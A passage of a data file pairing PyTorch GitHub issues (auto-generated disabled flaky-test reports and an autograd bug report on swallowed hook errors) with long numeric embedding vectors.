 -6.09867759e-02  2.03811184e-01  1.20309703e-01 -1.23752952e-01
 -1.35569736e-01  9.37421173e-02 -3.59982252e-01 -3.06503594e-01
  2.43300974e-01 -2.56320573e-02  9.46647003e-02  3.21143180e-01
 -5.71721345e-02  2.41312206e-01  1.65371466e-02  2.71137170e-02
 -6.73478395e-02  4.50026274e-01 -1.25626832e-01  4.57310259e-01
  3.54988091e-02  1.10106267e-01 -1.42570078e-01  4.31006029e-02
 -2.19781268e-02 -1.61735371e-01  4.18592274e-01 -5.97308457e-01
  5.85912392e-02  7.59228393e-02  1.46148533e-01 -1.33340433e-01
  3.94939780e-01  1.74709857e-01 -1.24180056e-02 -1.80516899e-01
  1.44005716e-02  2.73748189e-01 -1.21157072e-01 -1.01243228e-01
  2.89648652e-01 -4.62172449e-01 -1.63539171e-01 -1.29525736e-01
 -2.37219900e-01 -1.22660220e-01 -2.95858271e-03  1.96308106e-01
  6.78992569e-02  4.83474582e-02 -3.76961887e-01  1.95147976e-01
  2.69688189e-01 -2.88332343e-01 -4.41984758e-02 -3.68375927e-01
 -6.89970702e-02  1.22032262e-01  1.79047883e-01 -1.97248146e-01
  2.44168192e-03  5.02444804e-04  1.07283622e-01 -3.77128348e-02
  4.90892291e-01 -2.38589719e-01  1.97488755e-01  2.26229042e-01
 -1.35704473e-01  3.28468055e-01  3.05032786e-02 -3.03044189e-02
 -7.26120919e-02  1.72158763e-01  9.27233696e-02  1.07752562e-01
  3.55987966e-01 -7.87056088e-02 -3.31600666e-01  1.07788987e-01
  9.80394483e-02 -1.12770922e-01 -3.94431710e-01 -1.00526668e-01
 -9.17839557e-02  4.48255688e-02 -4.39655408e-02 -9.16141346e-02
 -9.57832634e-02 -1.72279060e-01  5.67878932e-02 -8.63142684e-02
 -2.54197538e-01  5.46551585e-01  4.75774929e-02 -1.59910962e-01
  1.47519797e-01  4.74815741e-02  1.07599959e-01 -3.45720261e-01
 -9.31192487e-02 -4.22696769e-02  2.27073058e-01  2.55195856e-01
  2.11497635e-01  2.45379806e-01  5.51176742e-02 -5.96061274e-02
 -4.17642355e-01 -1.73471123e-01 -1.17457807e-01  4.13042724e-01
  1.11151844e-01 -1.32102259e-02  1.77104801e-01  6.46155357e-01
 -2.21374452e-01 -2.13630855e-01 -1.98860362e-01 -2.30636716e-01
  3.04528475e-01 -2.20724091e-01  7.10937679e-02 -3.04086283e-02
  5.05947135e-02  2.64500827e-01 -2.90681958e-01  2.96044767e-01
 -1.70862257e-01  2.90605545e-01  7.36005902e-02 -1.39374152e-01
  7.42764026e-02 -2.16094613e-01 -8.08278173e-02 -5.93713894e-02
 -2.25174382e-01  1.18832886e-01 -6.48343116e-02  1.60146788e-01]"
DISABLED test_tensor_dtype_complex (__main__.CommTest) oncall: distributed module: flaky-tests skipped,"Platforms: linux

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_tensor_dtype_complex&suite=CommTest) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18199906633).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 2 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_tensor_dtype_complex`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `distributed/test_c10d_ucc.py`

cc @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @osalpekar @jiayisuse @H-Huang @kwen2501 @awgu @penguinwu",False,"[-0.2968097  -0.38703287 -0.2784851   0.1479735   0.07495256 -0.40898386
  0.16688734 -0.00774495 -0.4710926  -0.44013894  0.32671213 -0.10621981
 -0.03911929  0.08896451 -0.36854658 -0.03481098  0.0220187  -0.22649136
  0.16692933  0.132188   -0.23057564 -0.07622701 -0.09982229  0.17669365
 -0.13959336 -0.03574498 -0.03136024 -0.06876901 -0.03587773  0.07882507
  0.5127344   0.31913885 -0.42098427  0.00892219  0.10010417  0.2716184
 -0.11340495 -0.2550388  -0.04575785 -0.20188309  0.14723516  0.01782685
  0.19639221  0.16596843  0.0134147  -0.06416966 -0.18545851  0.12602855
 -0.19016281 -0.16060244  0.09657981 -0.16747396 -0.02549585 -0.4774797
  0.00248943 -0.5028096   0.2714392   0.22728044  0.10871944  0.23114522
  0.1181742   0.00120404  0.13008854  0.14019856  0.05003459  0.20127791
  0.18212524 -0.26106405  0.64001626  0.0283852   0.19101122  0.20449492
 -0.42741695  0.09091407  0.17149422  0.11848311 -0.07045767  0.03140331
  0.18861355 -0.06906421  0.01386034 -0.13326806  0.15805271 -0.18543775
  0.14505512  0.13209108  0.23542884 -0.0117994   0.23815763 -0.35118598
  0.24035075  0.25792658 -0.45144826 -0.04301487 -0.0722945   0.08361499
  0.36635572 -0.06431754 -0.216216    0.23143421 -0.04986087 -0.36217895
 -0.26864433  0.2896281  -0.23410392 -0.21140131  0.3489207   0.01500529
  0.05224649 -0.11849611  0.11825277 -0.01805078  0.11314974  0.20344105
  0.03076294 -0.11272267 -0.15658791  0.09941038  0.05326524  0.4200026
 -0.34356582 -0.2000283   0.289895   -0.02888751  0.47695398 -0.08189052
 -0.16689557  0.17122371 -0.09959801 -0.24979925  0.12315749  0.03014365
 -0.1471538  -0.01339459  0.14754452  0.00969598 -0.21060966 -0.12183072
 -0.1831324   0.09421859 -0.25325423  0.27046323  0.01329103 -0.17640805
 -0.00919225 -0.11696996 -0.2421938   0.11305994 -0.10516347  0.18758631
  0.09461004  0.09825924 -0.00647476  0.35828745  0.10074389  0.31451
  0.32163733 -0.01975168 -0.20423561 -0.19342338 -0.04530059  0.50031734
 -0.29894212  0.13343567 -0.0649083   0.04341298 -0.32372886  0.01344874
 -0.0340582   0.14371401 -0.03892085 -0.06057838 -0.06422174  0.10461657
 -0.00208422 -0.11379193  0.20805228 -0.3747274  -0.13725819  0.36679888
  0.11439967 -0.18312371  0.22476709  0.3215152   0.04683195  0.27230948
  0.14740199  0.08283605 -0.08636042 -0.22787832 -0.37692487 -0.09299371
  0.0851662  -0.10383872 -0.12900522 -0.2117329   0.14833626 -0.03431483
  0.11037343  0.19213305 -0.224476   -0.11822434  0.17606261 -0.11082959
 -0.03704955  0.01853245 -0.17336246 -0.30043802  0.09851034  0.0524696
 -0.36109644 -0.07126504 -0.21343797 -0.20760222 -0.23647514 -0.02041348
  0.03388605 -0.09772219 -0.03689174  0.3405123  -0.08226405 -0.33511528
 -0.11667135 -0.19685902 -0.33540866 -0.17311803 -0.14526185  0.34715313
 -0.05365261  0.19682844  0.02660867 -0.02488895  0.28052974  0.17329052
  0.12307808 -0.03998836 -0.33292773 -0.23212963 -0.10400921  0.41675898
 -0.37665576 -0.34487295 -0.11376282  0.05775274  0.09307176  0.48378733
 -0.28371143 -0.10088435 -0.29920304  0.04606582 -0.02578451 -0.13429794
 -0.02604898  0.10076522  0.3960985   0.22041798 -0.01935142  0.01735353
  0.2596419  -0.10682173  0.35978514  0.27754718 -0.1661695   0.45025247
  0.29268742  0.37813675 -0.36828795  0.21781796  0.14268905 -0.13780184
  0.0506752  -0.3079478   0.1173597  -0.00369418  0.0448212  -0.24430177
  0.3685317  -0.15008293 -0.19469413  0.08183734  0.07311726  0.12008688
 -0.00231797  0.15210095  0.045524   -0.321414   -0.11342946 -0.22275248
 -0.37954652 -0.03195209 -0.1425159   0.23361297  0.24905905  0.14341712
 -0.12668315  0.09707969  0.08169468 -0.20774287  0.23295201  0.11746833
 -0.00653122  0.03227875  0.05653489 -0.18553202  0.20044154 -0.13132274
  0.10767892  0.0518447   0.43119508 -0.21917479 -0.12553178  0.17865726
  0.06065666  0.2999819   0.16685712  0.08866424 -0.38607347  0.48226643
  0.1600428   0.12504399  0.22854508 -0.06203426 -0.500612    0.01225327
  0.1192587  -0.06258564 -0.3116976  -0.11195837 -0.15939501  0.07121663
 -0.12895076 -0.26249635 -0.20891047 -0.08120248  0.09340993 -0.03264214
 -0.30651188  0.30496573  0.06820169 -0.14711308  0.04641109 -0.2372525
  0.02830162 -0.20290303 -0.0972845  -0.04223984  0.2584669   0.2885931
  0.11136395 -0.02079422 -0.08073207  0.05153368 -0.61347944  0.05264637
  0.19587645  0.5151546   0.11063494  0.10298262  0.4248357   0.6278877
 -0.28865165 -0.22152144 -0.25854325 -0.11903186  0.11982206 -0.08161883
 -0.22137126 -0.07348811  0.28528237  0.28117153 -0.34395748  0.13661149
 -0.3077086   0.10086013  0.34354174 -0.28733602 -0.11851408  0.04359112
 -0.12823096 -0.09788602  0.16054362  0.06819823  0.1499773   0.20408893]"
[Autograd] `Variable._execution_engine.queue_callback` swallows error message module: autograd triaged,"

```
from typing import Any, Callable

import torch
import torch.nn as nn
from torch.autograd import Variable
from torch.distributed.utils import _apply_to_tensors


def hook(*args, **kwargs):
    assert 0, ""Hello world!""


def register_backward_hook(output: Any, hook: Callable):
    if not torch.is_grad_enabled():
        return output

    def _register_hook(tensor: torch.Tensor):
        if tensor.requires_grad:
            tensor.register_hook(
                lambda *args, **kwargs: Variable._execution_engine.queue_callback(hook)
            )
        return tensor

    return _apply_to_tensors(_register_hook, output)


model = nn.Sequential(
    nn.Linear(3, 3, device=""cuda""), nn.ReLU(), nn.Linear(3, 3, device=""cuda"")
)
out = model(torch.randn(2, 3, device=""cuda""))
register_backward_hook(out, hook)
out.sum().backward()
```

`Hello world!` is not printed:
```
Traceback (most recent call last):
  File ""/data/users/andgu/sandbox/non_distributed/repro_autograd_error.py"", line 32, in <module>
    out.sum().backward()
  File ""/data/users/andgu/pytorch/torch/_tensor.py"", line 503, in backward
    torch.autograd.backward(
  File ""/data/users/andgu/pytorch/torch/autograd/__init__.py"", line 254, in backward
    Variable._execution_engine.run_backward(  # Calls into the C++ engine to run the backward pass
SystemError: <built-in method run_backward of torch._C._EngineBase object at 0x7f762e58bd40> returned NULL without setting an exception
```

cc @ezyang @albanD @zou3519 @gqchen @pearu @nikitaved @soulitzer @Lezcano @Varal7",False,"[-0.4997308  -0.0801426  -0.29819036  0.08684713  0.18773621 -0.05526802
  0.12222753  0.12416359 -0.75803196 -0.01057616 -0.08175114 -0.19855312
 -0.3071282   0.23822547 -0.17717686  0.18942404 -0.43798134 -0.44708508
  0.21434757 -0.43372998  0.25607505  0.12027259 -0.05205639  0.02670369
 -0.02621531  0.3388642  -0.15383409 -0.13049392  0.31643453  0.07213058
  0.1006366  -0.33794665 -0.569191    0.277712    0.28438315  0.08185659
 -0.2968269  -0.01774802 -0.13276209 -0.14280666  0.46462244  0.0821744
 -0.17170942 -0.29306683  0.21792856 -0.0944993  -0.04338651 -0.06290826
 -0.33121285 -0.21236786  0.07081092  0.09007176 -0.35344982 -0.01878701
 -0.04964182 -0.42437592 -0.0783463  -0.08855431  0.24174151 -0.37159914
  0.04751148 -0.24104202 -0.0096776  -0.02956809 -0.48648798 -0.41380385
 -0.05998714  0.2544648   0.4433217  -0.04066408 -0.23934092  0.03269469
  0.03622457 -0.08205436  0.24176818  0.0626517  -0.28424668 -0.11834639
 -0.28933823 -0.22443524  0.01712393  0.21008222  0.03575213  0.10879552
 -0.0206092  -0.03075453  0.20141283 -0.08324991  0.41102105  0.31657007
  0.09703328  0.0313393   0.22156313  0.51037943  0.03301173  0.12364019
  0.4133197  -0.17929612 -0.10587947 -0.28068578 -0.13353828 -0.3480388
 -0.13178824  0.17664997  0.1275387   0.1239453  -0.03739929  0.3659408
  0.29026756 -0.34018433  0.05701429  0.24117619  0.04000307 -0.19620903
 -0.03308631  0.05241861 -0.6487434  -0.2731884  -0.06529073  0.5780637
 -0.11650778  0.36325383  0.23131117  0.2936672   0.30843836 -0.03782758
  0.22314695 -0.15415603 -0.05386879  0.06740417 -0.10700633  0.12585254
  0.05297203 -0.17737962  0.44942924  0.33484384 -0.42765263  0.23912778
 -0.10343944  0.04749011 -0.14905635  0.24673322 -0.22119713 -0.00998232
  0.09239544 -0.1869683   0.02483272  0.13552152 -0.00373728 -0.23444596
  0.20467845 -0.1768499  -0.6875338   0.2416141   0.09213632  0.2808507
  0.5332974   0.06630887  0.56380546 -0.31511503  0.45247114  0.17900425
  0.12345522 -0.06484086  0.30701965 -0.02151455 -0.24766184  0.10623409
 -0.35731998  0.18231589  0.02094526 -0.18192974 -0.15036204 -0.18228894
  0.28596872  0.04591402  0.21141417 -0.31054804 -0.5327329   0.4816676
  0.3965157   0.40575624  0.31125632  0.03644727  0.1347539   0.17431706
  0.29507548 -0.08698852 -0.28261432 -0.07521378 -0.23628256 -0.18467316
  0.16093814 -0.10972445 -0.03887355  0.21554583 -0.12955724 -0.39384726
 -0.14497969 -0.2031228  -0.20525731  0.04061368 -0.08239114  0.01551899
  0.01599332 -0.02297267 -0.18148059 -0.31980306 -0.3910992  -0.09599543
 -0.2096686  -0.3926229   0.02711203 -0.33122218 -0.0022414  -0.16381043
  0.29211283  0.17703366 -0.01271586  0.1093172   0.34793484 -0.07604053
  0.1229106  -0.22403933  0.3363773   0.26313972 -0.5220934   0.07960419
  0.01552941  0.07506686 -0.12415661 -0.18778008  0.24766818 -0.01226965
  0.06973451  0.33257627  0.38931316  0.03161095 -0.1788102   0.22085844
 -0.30549246 -0.05823714  0.16234308 -0.12658915 -0.25341427 -0.02647308
 -0.3304906  -0.16466981 -0.20296569  0.06989778 -0.05284372  0.1578548
 -0.08575866  0.10028504  0.4689413   0.3017552  -0.18837091  0.13690037
 -0.07174721 -0.00944033 -0.01364783  0.24731794 -0.08210994  0.20921057
  0.44793892 -0.18979013 -0.3169042  -0.01054347 -0.05878227  0.06855839
 -0.13697605 -0.3603535   0.40505528  0.30073547  0.01420731 -0.02655458
  0.45222795 -0.08659492  0.3271877  -0.12431557  0.4265197   0.40360266
 -0.39221725  0.20059371  0.32979774 -0.2419302   0.16955318 -0.24317086
 -0.23759878 -0.1506437  -0.14822625 -0.19820717  0.5314194  -0.05297077
 -0.16620013 -0.01994293  0.2307379  -0.34896082 -0.20372885  0.07451221
 -0.13775396  0.21852505  0.44551355 -0.24902192 -0.17705591 -0.02710846
  0.52683187  0.31327254  0.4935053  -0.34352538  0.2504458   0.04530382
  0.09751417  0.04883928  0.11242129 -0.03503075 -0.11634416  0.06518916
  0.33939338 -0.16426313  0.11062095 -0.2691416  -0.11688922  0.22604468
 -0.16976306 -0.14434522 -0.02845366  0.01529865 -0.1540603   0.04562642
  0.02106231 -0.01325234  0.30145144  0.30982178 -0.13868181 -0.29116744
 -0.02061725  0.6631825  -0.03980457 -0.44756788 -0.32353902  0.07216837
  0.27653873 -0.05381128 -0.23173785 -0.19740681  0.5749823   0.05024728
 -0.09601185  0.11524282 -0.11192341 -0.19057736 -0.10585582  0.33115822
  0.30753732  0.22887114  0.14362173 -0.08467571 -0.08322059  0.385856
 -0.08789465  0.18422675 -0.2787408  -0.5000744  -0.04897759  0.08006482
 -0.16101645 -0.05371575  0.18912424  0.19023937 -0.09781821  0.0890846
 -0.09539601  0.11463711  0.56620544 -0.17222467  0.00114706 -0.13041127
  0.08821322 -0.03266758 -0.10488465  0.12837285  0.04482397 -0.2417714 ]"
DISABLED test_layer_norm_backward_size_1023_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_layer_norm_backward_size_1023_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18185884821).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 6 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_layer_norm_backward_size_1023_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-2.51249701e-01  2.74961423e-02 -1.51804313e-01 -1.31823439e-02
 -1.62260681e-01 -3.01190495e-01 -8.37176293e-02  2.08022133e-01
 -5.21395028e-01 -9.94743854e-02  3.74786586e-01 -1.43870279e-01
  3.72196704e-01  9.26719978e-02 -1.34440497e-01  9.95041616e-03
 -2.43024737e-01 -1.01264842e-01  4.04496014e-01  1.01754680e-01
 -1.26606151e-01 -4.62131128e-02 -1.96920320e-01  3.19897324e-01
  1.99593127e-01  3.05769593e-02 -2.28289187e-01 -7.08145201e-02
  1.40717357e-01  6.29344136e-02  1.37282133e-01  1.58049941e-01
 -3.04299355e-01 -4.89172079e-02  4.94494587e-01  1.81607351e-01
 -1.04854167e-01 -1.58322722e-01 -3.39696288e-01  4.34418172e-02
  2.37948909e-01  1.64926469e-01 -6.34747297e-02 -1.06754333e-01
  1.91350192e-01  2.98588909e-02 -1.13374934e-01  3.17541718e-01
 -2.95228541e-01 -3.45755190e-01  2.85287619e-01 -9.71164331e-02
 -3.86741310e-02 -3.77932429e-01  9.26859025e-03 -3.47143650e-01
  1.28453135e-01  3.16489100e-01  9.47081298e-02  3.13760787e-01
  7.83749819e-02 -2.33290121e-02 -9.69796404e-02 -1.49665713e-01
 -3.99539098e-02  5.77545166e-02  1.90783426e-01 -1.81908250e-01
  3.46944332e-01  5.16630076e-02  1.51191592e-01 -4.13649250e-03
 -3.63649607e-01 -4.43081744e-02  2.32372344e-01  1.97610497e-01
 -2.69244909e-01  5.41755073e-02 -1.00551397e-01 -9.01388898e-02
 -8.21208879e-02  4.10634689e-02  5.03818542e-02  6.11468405e-02
  1.22084334e-01  4.82720416e-03  1.64040729e-01 -4.19596396e-02
  7.55487978e-02 -2.60849267e-01  3.87730002e-01  2.12161347e-01
 -3.92999738e-01  5.03589623e-02 -6.67726323e-02 -1.41130075e-01
  2.55371869e-01 -1.81040317e-01 -2.35631019e-01  1.93734720e-01
  2.49157608e-01 -4.30983037e-01 -1.65777832e-01  4.00442213e-01
 -1.82329327e-01 -2.17719793e-01  4.28202540e-01  1.41789556e-01
 -3.12030800e-02 -6.76740408e-02  1.88700736e-01  8.97087343e-03
 -6.67440221e-02  6.58520162e-02  1.35613292e-01 -1.12832621e-01
 -2.04379424e-01 -1.40818357e-01 -3.05802561e-03  5.22370219e-01
 -2.27399692e-01 -9.43376869e-02  1.24698296e-01 -9.88786370e-02
  3.29210103e-01 -6.87343627e-03  2.46720165e-02 -5.41338883e-03
  2.05911487e-01  1.84293598e-01  1.14884794e-01  2.11752698e-01
 -2.43179351e-01 -5.72661422e-02  6.86276332e-02  8.17745402e-02
 -1.03047185e-01 -2.50514090e-01 -1.37589658e-02  1.53122157e-01
 -3.23021919e-01  2.61574239e-01 -7.51578715e-03 -2.69720227e-01
  4.87969935e-01  7.19008893e-02 -2.96310544e-01  1.21242717e-01
 -8.13631248e-03  7.68229440e-02  2.35487893e-02  4.43424284e-02
  2.81835616e-01  2.00624034e-01  1.24502674e-01 -2.72044353e-02
  1.56173304e-01  4.88806665e-02  1.62165135e-01 -1.88807636e-01
  3.25420089e-02  3.19575667e-01 -1.63877517e-01  6.92440197e-02
  2.44482994e-01 -8.03054199e-02 -4.46988702e-01 -8.64363685e-02
  4.48638536e-02  1.40912771e-01  3.47347260e-02  2.63391584e-02
  2.35531777e-01  4.20822091e-02  1.04038700e-01 -2.70948350e-01
  1.42286986e-01 -4.09897178e-01 -5.73976822e-02  2.03826219e-01
  5.85080758e-02 -6.53444752e-02  2.50666291e-01  9.15079415e-02
  9.33070481e-03  1.27541065e-01  2.61040241e-01 -5.65621927e-02
  5.40138595e-02 -6.78024441e-02 -6.96358442e-01 -2.23357007e-01
  5.38778454e-02  5.10690883e-02 -2.06171930e-01 -3.63583982e-01
 -4.53795269e-02 -2.76295468e-04 -8.09221119e-02  8.50469172e-02
 -3.24454725e-01  3.44210714e-01  2.57916689e-01  4.11627889e-02
  1.85901448e-02  1.18835069e-01 -2.03349352e-01 -3.84129882e-01
 -3.87004912e-02  1.46401122e-01 -3.03708613e-01 -1.19838096e-01
 -2.52534226e-02 -3.99260193e-01 -6.37287460e-03  1.75812230e-01
  6.17620908e-02 -1.14831731e-01  2.84299031e-02  1.80865154e-01
 -1.86390162e-01 -1.31131619e-01 -3.33530396e-01 -1.14232317e-01
 -4.63297963e-01 -6.58779591e-02 -2.21589595e-01  3.71725768e-01
 -2.55569816e-02  7.50231445e-02 -1.78074747e-01 -3.90385464e-02
  1.26931936e-01 -2.87800431e-02  4.11973387e-01 -3.83060694e-01
 -1.84279263e-01 -9.84640047e-02  7.94512182e-02  4.97630686e-01
 -6.09313786e-01 -4.90691215e-01 -8.59575868e-02 -1.47955222e-02
 -5.22542931e-02  1.70758918e-01  1.08668156e-01 -1.26608998e-01
 -1.41754851e-01  9.35864970e-02 -3.53619695e-01 -3.09791446e-01
  2.53396332e-01 -1.94262490e-02  8.74172151e-02  3.24446499e-01
 -7.14663193e-02  2.37319738e-01  1.96750611e-02  2.14352123e-02
 -7.28162825e-02  4.61618572e-01 -1.33251578e-01  4.59504902e-01
  3.52514759e-02  1.10961422e-01 -1.43465072e-01  4.21186946e-02
 -1.51149984e-02 -1.58516318e-01  4.31511372e-01 -5.99581718e-01
  4.17539179e-02  8.36791396e-02  1.51226893e-01 -1.44998848e-01
  3.91414344e-01  1.69419110e-01 -1.35510163e-02 -1.80247426e-01
  9.11579281e-03  2.73489237e-01 -1.13627344e-01 -9.83042568e-02
  2.84380287e-01 -4.51882392e-01 -1.61253333e-01 -1.35113984e-01
 -2.35810310e-01 -1.22332990e-01 -4.32157889e-03  1.87152997e-01
  7.00846165e-02  4.52198349e-02 -3.72003257e-01  1.99459955e-01
  2.77951241e-01 -3.08949947e-01 -3.85583080e-02 -3.56321096e-01
 -5.65717705e-02  1.36001900e-01  1.71403274e-01 -2.16993466e-01
  1.62961986e-02  5.23668807e-03  1.11495912e-01 -4.19003144e-02
  4.91075933e-01 -2.40910977e-01  1.97265059e-01  2.17931226e-01
 -1.44001544e-01  3.23168576e-01  2.65440308e-02 -2.58827768e-02
 -6.82840571e-02  1.71749413e-01  9.65270922e-02  1.07565999e-01
  3.58739376e-01 -7.42169917e-02 -3.37124497e-01  1.04194574e-01
  9.64791998e-02 -1.09346725e-01 -4.00656819e-01 -1.07222751e-01
 -8.82022008e-02  4.53287214e-02 -4.48253714e-02 -8.43343437e-02
 -9.48989615e-02 -1.88609272e-01  5.12441844e-02 -7.98513144e-02
 -2.55055904e-01  5.49700856e-01  4.71245050e-02 -1.54047862e-01
  1.43952101e-01  5.39626814e-02  1.12001762e-01 -3.40765446e-01
 -8.47465545e-02 -3.78159210e-02  2.25848258e-01  2.54024208e-01
  2.09980980e-01  2.37740874e-01  5.83518147e-02 -6.14837743e-02
 -4.24711049e-01 -1.77189857e-01 -9.37679335e-02  3.99322569e-01
  1.08902469e-01 -1.17432335e-02  1.73005372e-01  6.20994091e-01
 -2.28136957e-01 -2.09652215e-01 -1.95672959e-01 -2.45087638e-01
  3.07055801e-01 -2.27328062e-01  6.98823929e-02 -2.96904389e-02
  5.26452325e-02  2.54235685e-01 -2.89598525e-01  2.92729616e-01
 -1.75029844e-01  2.92955577e-01  7.94384032e-02 -1.35194629e-01
  7.08657503e-02 -2.10178047e-01 -8.61986428e-02 -5.91876693e-02
 -2.06510022e-01  1.19228229e-01 -5.51683754e-02  1.65990025e-01]"
DISABLED test_layer_norm_backward_edge_case_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_layer_norm_backward_edge_case_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18173611830).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 6 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_layer_norm_backward_edge_case_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-2.34524637e-01  6.68705478e-02 -6.08085692e-02 -1.63798407e-01
 -4.00603861e-02 -3.30572605e-01  1.97985247e-02  1.22246981e-01
 -4.88513112e-01 -9.26555768e-02  3.55030656e-01 -1.45067394e-01
  3.95403802e-01  1.51563048e-01 -1.10908650e-01 -2.00454965e-02
 -1.61449403e-01 -1.08088784e-01  4.65534896e-01  1.53395385e-01
 -2.31343985e-01  5.66339679e-03 -2.57736415e-01  1.78657025e-01
  4.30770963e-02 -7.20874593e-02 -1.14355564e-01 -8.83510038e-02
  1.51616633e-01  3.92807201e-02  1.84217751e-01  1.13160551e-01
 -3.33319902e-01  3.92129049e-02  4.23549086e-01  1.96066231e-01
 -7.79304504e-02 -1.64921477e-01 -3.79430145e-01 -6.40876740e-02
  2.14666560e-01 -4.42093797e-03 -9.57536101e-02 -7.32409060e-02
  2.31745586e-01  5.01034074e-02 -2.72387341e-02  1.88707590e-01
 -2.42871001e-01 -1.42493993e-01  2.42609441e-01 -8.91219527e-02
  6.92685917e-02 -4.47406411e-01  2.49696746e-02 -1.09080747e-01
  1.71911836e-01  4.62735951e-01  1.31705627e-01  2.64166683e-01
  1.62565142e-01 -5.75259812e-02 -1.20903887e-01 -8.79926011e-02
  4.68925834e-02  9.37935039e-02  1.64522663e-01 -1.50788605e-01
  3.35698485e-01  3.45594026e-02  1.99817821e-01 -3.18609178e-02
 -3.90751660e-01 -1.96811348e-01  2.30279654e-01  1.57625675e-01
 -2.76784867e-01 -3.37384976e-02 -1.46552652e-01 -1.15570746e-01
 -1.60905644e-01  1.03164963e-01 -7.85625726e-02  4.06355336e-02
  2.43660025e-02 -2.51291022e-02  1.02419145e-01 -6.66416734e-02
  4.35140170e-02 -2.02577770e-01  4.21187341e-01  6.55551851e-02
 -2.53858924e-01 -2.71025859e-03 -2.99797878e-02  4.10904847e-02
  2.78390884e-01 -8.50272700e-02 -2.73719311e-01  2.08228350e-01
  1.30608946e-01 -4.48554873e-01 -2.04500109e-01  3.25484514e-01
 -1.77293822e-01 -2.33224690e-01  3.57713044e-01  8.39387253e-02
 -8.56636539e-02 -1.28969848e-01  7.20413476e-02  6.10281751e-02
 -1.17311375e-02  5.71588390e-02  2.02624127e-02 -2.00413913e-01
 -1.20665006e-01 -1.32407814e-01  5.27548641e-02  4.14546907e-01
 -8.19078088e-02 -9.83330309e-02  1.44303337e-01 -3.83658148e-02
  2.55775034e-01 -4.17931937e-02 -2.92370841e-02  1.26471901e-02
  1.77475557e-01  1.11903660e-02  1.18272841e-01  1.14038840e-01
 -1.60647437e-01 -1.12748653e-01  6.84524886e-03  6.43630326e-02
 -6.42237887e-02 -1.45507485e-01  7.43129179e-02  9.12995040e-02
 -3.24730068e-01  1.93291083e-01  4.62117344e-02 -2.03079909e-01
  2.46549413e-01 -8.59434009e-02 -2.27032468e-01  4.68918085e-02
 -9.23977941e-02  1.67461112e-02  3.23767699e-02  7.33530428e-03
  2.58599550e-01  2.95802981e-01  1.36759982e-01  1.94184780e-02
  3.32958162e-01  8.58148485e-02  1.71347603e-01 -6.04244582e-02
  2.63516419e-02  4.35977429e-01 -1.34376764e-01  2.06464142e-01
  2.48812199e-01 -2.57307552e-02 -4.73285705e-01 -9.52113494e-02
 -2.84780748e-04  8.51673633e-02  4.73552868e-02  7.28675127e-02
  1.86259836e-01 -2.53976770e-02  7.02885091e-02 -2.38791808e-01
  1.42420888e-01 -3.94382775e-01 -1.05563864e-01  2.12734118e-01
  9.46563035e-02 -5.76724783e-02  1.46683782e-01  9.98195708e-02
 -4.22818772e-02  1.88211799e-01  1.86070383e-01 -7.60570541e-02
  7.34291077e-02 -6.39946759e-02 -5.31161606e-01 -1.97334930e-01
 -2.14332622e-03  6.50806576e-02 -2.16122359e-01 -3.02707493e-01
 -2.22479366e-03 -1.66292340e-01 -9.90779474e-02  1.56652778e-01
 -2.87099600e-01  3.06944251e-01  2.20582560e-01 -3.36968005e-02
  6.60273582e-02  2.05740646e-01 -2.08855808e-01 -5.69630563e-01
 -1.41632468e-01  1.55482575e-01 -2.32862175e-01 -1.06103405e-01
  6.31756485e-02 -2.56443679e-01  4.74730432e-02  7.08256885e-02
 -1.71973556e-02 -1.10036984e-01 -7.73946494e-02  1.50164157e-01
 -3.25657547e-01  5.03246002e-02 -1.94458231e-01 -1.82131737e-01
 -2.96905249e-01 -4.26081419e-02 -1.87863499e-01  3.23685706e-01
  2.26998366e-02  2.38366658e-03 -1.24733038e-01 -9.98054966e-02
 -3.11747380e-02  1.64535493e-02  3.99466872e-01 -2.82770634e-01
 -1.60443470e-01 -4.21176814e-02  1.03248127e-01  4.81849968e-01
 -5.15450239e-01 -5.53922534e-01 -1.45114884e-01  9.92084295e-02
 -3.17014232e-02  1.52356237e-01 -4.55097482e-03 -1.34399742e-01
